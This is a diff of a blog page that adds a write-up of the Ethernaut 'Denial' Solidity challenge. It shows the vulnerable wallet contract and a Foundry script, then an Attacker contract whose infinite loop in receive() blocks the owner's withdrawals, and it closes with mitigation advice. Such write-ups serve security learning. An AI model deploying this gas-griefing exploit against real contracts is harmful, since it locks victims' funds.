@@ -12,7 +12,9 @@
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
 
   <title>Denial – jfrancai</title>
-  <meta name="description" content="coming soon" />
+  <meta name="description" content="This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
+If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Denial { address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public { partner = _partner; } // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this)." />
 
   
 
@@ -826,7 +828,129 @@
         <div class="content">
           <h1>Denial</h1>
           <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
-<p>coming soon</p>
+<p>This is a simple wallet that drips funds over time. You can withdraw the funds
+slowly by becoming a withdrawing partner.</p>
+<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code>
+(whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Denial</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">partner</span><span class="p">;</span> <span class="c1">// withdrawal partner - pay the gas, split the withdraw
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">owner</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint</span> <span class="n">timeLastWithdrawn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">withdrawPartnerBalances</span><span class="p">;</span> <span class="c1">// keep track of partners balances
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setWithdrawPartner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_partner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">partner</span> <span class="o">=</span> <span class="n">_partner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// withdraw 1% to recipient and 1% to owner
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">amountToSend</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// perform a call without checking return
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// The recipient can revert, the owner will still get their share
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">partner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="n">amountToSend</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">owner</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// keep track of last withdrawal time
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">timeLastWithdrawn</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">withdrawPartnerBalances</span><span class="p">[</span><span class="n">partner</span><span class="p">]</span> <span class="o">+=</span>  <span class="n">amountToSend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// allow deposit of funds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// convenience function
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">contractBalance</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>Solution:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Attacker</span><span class="p">,</span><span class="n">Denial</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#39;../src/20.sol&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deployerPrivateKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;INSTANCE_20&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">deployerPrivateKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">Attacker</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">Denial</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setWithdrawPartner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_partner</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attacker</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Denial</span> <span class="n">denial</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_denial</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">denial</span> <span class="o">=</span> <span class="n">Denial</span><span class="p">(</span><span class="n">_denial</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">denial</span><span class="p">.</span><span class="n">setWithdrawPartner</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Classic DOS attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>This level demonstrates that external calls to unknown contracts can still
+create denial of service attack vectors if a fixed amount of gas is not
+specified.</p>
+<p>If you are using a low level <code>call</code> to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example <code>call.gas(100000).value()</code>.</p>
+<p>Typically one should follow the <a href="http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern" target="_blank" rel="noopener">checks-effects-interactions</a>
+pattern to avoid reentrancy attacks, there can be other circumstances
+(such as multiple external calls at the end of a function) where issues
+such as this can arise.</p>
+<p><em>Note</em>: An external <code>CALL</code> can use at most 63/64 of the gas currently available
+at the time of the <code>CALL</code>.  Thus, depending on how much gas
+is required to
+complete a transaction, a transaction of sufficiently high gas (i.e. one
+such
+that 1/64 of the gas is capable of completing the remaining opcodes in
+the parent call) can be used to mitigate this particular attack.</p>
 
         </div>
         <div class="mt-16"></div>
